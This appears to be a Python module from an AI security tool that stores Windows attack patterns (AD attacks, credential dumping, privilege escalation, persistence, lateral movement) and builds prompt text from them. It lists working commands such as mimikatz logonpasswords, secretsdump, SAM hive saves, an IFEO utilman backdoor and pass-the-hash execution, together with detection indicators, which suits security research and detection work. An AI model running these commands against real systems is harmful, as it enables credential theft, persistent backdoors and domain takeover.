"""Windows security knowledge base.

Attack patterns for Windows environments:
1. Active Directory Attacks — Kerberoasting, AS-REP, DCSync, Golden/Silver tickets
2. Windows Credential Access — LSASS dump, SAM extraction, DPAPI, credential manager
3. Windows Privilege Escalation — service abuse, token impersonation, UAC bypass
4. Windows Persistence — services, WMI, COM, DLL hijacking, boot/logon
5. Windows Lateral Movement — WMI, PSRemoting, DCOM, RDP, SMB
"""

from __future__ import annotations

from dataclasses import dataclass, field
from enum import Enum
from typing import Any

import structlog

logger = structlog.get_logger()


class WindowsAttackType(str, Enum):
    AD_ATTACKS = "ad_attacks"
    CREDENTIAL_ACCESS = "credential_access"
    PRIVILEGE_ESCALATION = "privilege_escalation"
    PERSISTENCE = "persistence"
    LATERAL_MOVEMENT = "lateral_movement"


@dataclass
class WindowsPattern:
    name: str = ""
    attack_type: WindowsAttackType = WindowsAttackType.AD_ATTACKS
    description: str = ""
    techniques: list[str] = field(default_factory=list)
    indicators: list[str] = field(default_factory=list)
    tools: list[str] = field(default_factory=list)
    commands: list[str] = field(default_factory=list)
    mitre_ids: list[str] = field(default_factory=list)
    severity: str = "high"

    def to_dict(self) -> dict[str, Any]:
        return {"name": self.name, "type": self.attack_type.value, "severity": self.severity}


WINDOWS_PATTERNS: list[WindowsPattern] = [
    WindowsPattern(
        name="Active Directory Attacks",
        attack_type=WindowsAttackType.AD_ATTACKS,
        description="Attacking Active Directory: Kerberoasting (request TGS for SPN accounts, crack offline), AS-REP roasting (accounts without pre-auth), DCSync (replicate password hashes), Golden/Silver ticket forgery, and AD Certificate Services abuse.",
        techniques=[
            "Kerberoasting: request TGS tickets for SPN accounts, crack offline",
            "AS-REP roasting: target accounts without Kerberos pre-auth",
            "DCSync: replicate domain hashes via DRSUAPI (needs Replicating Directory Changes)",
            "Golden Ticket: forge TGT with krbtgt hash for persistent domain access",
            "Silver Ticket: forge TGS for specific service without contacting DC",
            "AD CS abuse: ESC1-ESC8 certificate template vulnerabilities",
            "Constrained delegation abuse: S4U2self/S4U2proxy",
            "Resource-based constrained delegation (RBCD) takeover",
        ],
        indicators=[
            "TGS requests for many SPN accounts in short time (Kerberoasting)",
            "AS-REQ without pre-auth for multiple accounts",
            "DRSUAPI replication from non-DC source (DCSync)",
            "TGT with abnormally long lifetime (Golden Ticket)",
            "Certificate enrollment for unusual template",
        ],
        tools=["impacket", "rubeus", "mimikatz", "certipy", "bloodhound"],
        commands=[
            "GetUserSPNs.py domain/user:pass -dc-ip DC_IP -request -outputfile kerberoast.txt",
            "GetNPUsers.py domain/ -dc-ip DC_IP -usersfile users.txt -format hashcat",
            "secretsdump.py domain/admin:pass@DC_IP -just-dc-ntlm",
            "certipy find -u user@domain -p pass -dc-ip DC_IP -vulnerable",
            "bloodhound-python -d domain -u user -p pass -c All -ns DC_IP",
        ],
        mitre_ids=["T1558", "T1003.006", "T1649"],
        severity="critical",
    ),
    WindowsPattern(
        name="Windows Credential Access",
        attack_type=WindowsAttackType.CREDENTIAL_ACCESS,
        description="Extracting credentials from Windows: LSASS memory dump, SAM/SYSTEM registry hive extraction, DPAPI master key decryption, Windows Credential Manager, cached domain credentials, and browser credential extraction.",
        techniques=[
            "LSASS dump via procdump, comsvcs.dll, or direct memory read",
            "SAM/SYSTEM hive extraction from registry or shadow copies",
            "DPAPI master key decryption with domain backup key",
            "Windows Credential Manager vault extraction",
            "Cached domain logon credentials (DCC2 hashes)",
            "Browser saved passwords (Chrome, Edge, Firefox)",
            "WiFi profile password extraction",
            "LSA secret extraction from registry",
        ],
        indicators=[
            "Process accessing LSASS memory (MiniDumpWriteDump)",
            "Registry hive access to SAM/SYSTEM/SECURITY",
            "Shadow copy creation followed by file extraction",
            "Unusual process accessing DPAPI master key files",
            "Browser credential store file access",
        ],
        tools=["mimikatz", "impacket", "pypykatz", "lazagne", "SharpDPAPI"],
        commands=[
            "sekurlsa::logonpasswords",
            "lsadump::sam /system:SYSTEM /sam:SAM",
            "dpapi::masterkey /in:masterkey_file /rpc",
            "vault::cred",
            "pypykatz live lsa",
            "reg save HKLM\\SAM sam.hiv && reg save HKLM\\SYSTEM system.hiv",
        ],
        mitre_ids=["T1003", "T1555", "T1552"],
        severity="critical",
    ),
    WindowsPattern(
        name="Windows Privilege Escalation",
        attack_type=WindowsAttackType.PRIVILEGE_ESCALATION,
        description="Escalating privileges on Windows: unquoted service paths, weak service permissions, token impersonation (Potato attacks), UAC bypass, AlwaysInstallElevated, and kernel exploits.",
        techniques=[
            "Unquoted service path exploitation (create binary in writable path)",
            "Weak service permissions: modify service binary or config",
            "Token impersonation: SeImpersonatePrivilege potato attacks",
            "PrintSpoofer/GodPotato for service account to SYSTEM",
            "UAC bypass via eventvwr.exe, fodhelper.exe, or CMSTP",
            "AlwaysInstallElevated: MSI package escalation",
            "DLL hijacking in high-privilege process search order",
            "Kernel exploit (e.g., PrintNightmare, HiveNightmare)",
        ],
        indicators=[
            "Service binary replaced or service config modified",
            "Named pipe created for potato-style impersonation",
            "UAC consent dialog bypassed (no prompt elevation)",
            "MSI package installed with SYSTEM privileges",
            "DLL loaded from user-writable directory by system process",
        ],
        tools=["winpeas", "powerup", "seatbelt", "sharpup", "potato-attacks"],
        commands=[
            "winPEASany.exe quiet fast searchfast",
            "PowerUp.ps1; Invoke-AllChecks",
            "sc qc <service_name>  # check unquoted path",
            "PrintSpoofer.exe -c 'cmd /c whoami > C:\\result.txt'",
            "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
            "Seatbelt.exe -group=all -full",
        ],
        mitre_ids=["T1574", "T1134", "T1548", "T1068"],
        severity="critical",
    ),
    WindowsPattern(
        name="Windows Persistence Mechanisms",
        attack_type=WindowsAttackType.PERSISTENCE,
        description="Establishing persistence: Windows services, scheduled tasks, registry autoruns, WMI event subscriptions, COM object hijacking, DLL search order hijacking, boot/logon scripts, and accessibility feature backdoors.",
        techniques=[
            "Create malicious Windows service (auto-start)",
            "Scheduled task with SYSTEM privileges",
            "Registry Run/RunOnce key modification",
            "WMI __EventFilter + CommandLineEventConsumer",
            "COM object hijacking (InProcServer32 modification)",
            "DLL search order hijacking in system PATH",
            "Image File Execution Options (IFEO) debugger",
            "Accessibility feature backdoor (sethc.exe, utilman.exe replacement)",
        ],
        indicators=[
            "New service created with unusual binary path",
            "Scheduled task pointing to temp/user-writable location",
            "Registry Run key added for unknown binary",
            "WMI permanent event subscription created",
            "COM InProcServer32 pointing to non-standard DLL",
            "IFEO debugger set for common system utilities",
        ],
        tools=["autoruns", "regshot", "procmon", "schtasks"],
        commands=[
            "sc create MySvc binPath= 'C:\\payload.exe' start= auto",
            "schtasks /create /tn 'Update' /tr 'payload.exe' /sc onlogon /ru SYSTEM",
            "reg add 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' /v Updater /d 'C:\\payload.exe'",
            "wmic /namespace:\\\\root\\subscription PATH __EventFilter CREATE Name='f1',EventNameSpace='root\\cimv2',QueryLanguage='WQL',Query='SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \"Win32_PerfFormattedData_PerfOS_System\"'",
            "reg add 'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\utilman.exe' /v Debugger /d 'C:\\Windows\\System32\\cmd.exe'",
        ],
        mitre_ids=["T1543", "T1053", "T1547", "T1546"],
        severity="high",
    ),
    WindowsPattern(
        name="Windows Lateral Movement",
        attack_type=WindowsAttackType.LATERAL_MOVEMENT,
        description="Moving laterally across Windows network: PsExec/SMB exec, WMI remote execution, PSRemoting, DCOM activation, RDP hijacking, Pass-the-Hash/Ticket, and WinRM.",
        techniques=[
            "PsExec: create service on remote host via SMB, execute payload",
            "WMI: Win32_Process.Create for remote command execution",
            "PSRemoting: Enter-PSSession / Invoke-Command on remote hosts",
            "DCOM: MMC20.Application, ShellWindows for remote exec",
            "RDP hijacking: tscon to take over disconnected sessions",
            "Pass-the-Hash: authenticate with NTLM hash without password",
            "Pass-the-Ticket: use stolen Kerberos ticket for authentication",
            "WinRM: evil-winrm for interactive remote PowerShell",
        ],
        indicators=[
            "New service created on remote host (PsExec pattern)",
            "WMI Win32_Process.Create from remote IP",
            "PowerShell remoting session from unusual source",
            "DCOM activation from network (CLSID in event logs)",
            "NTLM authentication without corresponding interactive logon",
        ],
        tools=["impacket", "crackmapexec", "evil-winrm", "psexec"],
        commands=[
            "psexec.py domain/user:pass@target cmd.exe",
            "wmiexec.py domain/user:pass@target 'whoami'",
            "evil-winrm -i target -u user -p pass",
            "crackmapexec smb targets.txt -u user -p pass --exec-method wmiexec -x 'whoami'",
            "smbexec.py domain/user@target -hashes :NTLM_HASH",
            "dcomexec.py domain/user:pass@target 'whoami'",
        ],
        mitre_ids=["T1021", "T1047", "T1563"],
        severity="high",
    ),
]


def build_windows_security_prompt(focus_type: WindowsAttackType | None = None, max_patterns: int = 5) -> str:
    lines = ["## Windows Security Knowledge\n"]
    patterns = WINDOWS_PATTERNS
    if focus_type:
        patterns = [p for p in patterns if p.attack_type == focus_type]
    for pattern in patterns[:max_patterns]:
        lines.append(f"### {pattern.name} [{pattern.severity}]")
        lines.append(pattern.description)
        lines.append("\nTechniques:")
        for t in pattern.techniques[:4]:
            lines.append(f"  - {t}")
        lines.append("\nMITRE: " + ", ".join(pattern.mitre_ids))
        lines.append("\nCommands:")
        for c in pattern.commands[:3]:
            lines.append(f"  $ {c}")
        lines.append("")
    return "\n".join(lines)
